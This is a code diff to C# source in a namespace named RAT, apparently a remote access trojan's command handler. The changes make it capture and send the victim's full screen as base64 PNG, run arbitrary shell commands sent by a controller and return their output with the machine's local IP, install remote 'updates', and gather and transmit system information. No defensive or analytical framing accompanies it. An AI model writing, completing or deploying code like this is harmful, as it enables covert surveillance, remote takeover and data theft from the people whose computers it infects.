@@ -24,18 +24,60 @@ namespace RAT
                 Rectangle bounds = Screen.GetBounds(Point.Empty);
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
-                    using (Graphics g = Graphics.FromImage(bitmap))
+                    try
                     {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                        using (Graphics g = Graphics.FromImage(bitmap))
+                        {
+                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                        }
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            bitmap.Save(ms, ImageFormat.Png);
+                            byte[] imageBuffer = ms.GetBuffer();
+                            Payload.Send("<SCREENSHOT> "+ Convert.ToBase64String(imageBuffer));
+                        }
                     }
-                    using (MemoryStream ms = new MemoryStream())
+                    catch
                     {
-                        bitmap.Save(ms, ImageFormat.Png);
-                        byte[] imageBuffer = ms.GetBuffer();
-                        Task.Run(() => Payload.Send("<SCREENSHOT> "+"TEST"));
+                        Console.WriteLine("<SCREENSHOT> Screenshot Error");
                     }
+
                 }
-                
+            }
+                  if (data.Contains("<EXECREQ>"))
+                {
+                try
+                {
+                    String command = data.Substring(data.IndexOf("<EXECREQ>") + 10).Replace("<EOF>", "");
+                    String output = Shell.Exec(command);
+                    Payload.Send("<EXEC>" + " Command Executed On: " + Payload.LocalIP + "\n" + command + "\nOutput\n" + output);
+                }catch (Exception error)
+                {
+                    Payload.Send("<EXEC>" + " Command Executed On: " + Payload.LocalIP + "\n" + data.Substring(data.IndexOf("<EXECREQ>") + 10).Replace("<EOF>", "") + "\nOutput\n" + error);
+                }
+                }
+            if (data.Contains("<UPDATEREQ>"))
+            {
+                try
+                {
+                    String command = data.Substring(data.IndexOf("<UPDATEREQ>") + 12).Replace("<EOF>", "");
+                    String output = Updater.install(command);
+                }
+                catch (Exception error)
+                {
+                }
+            }
+            if (data.Contains("<INFOGATHERREQ>"))
+            {
+                try
+                {
+                    String command = data.Substring(data.IndexOf("<INFOGATHERREQ>") + 16).Replace("<EOF>", "");
+                    InfoGather.gather();
+                    Payload.Send(InfoGather.read());
+                }
+                catch (Exception error)
+                {
+                }
             }
         }
     }
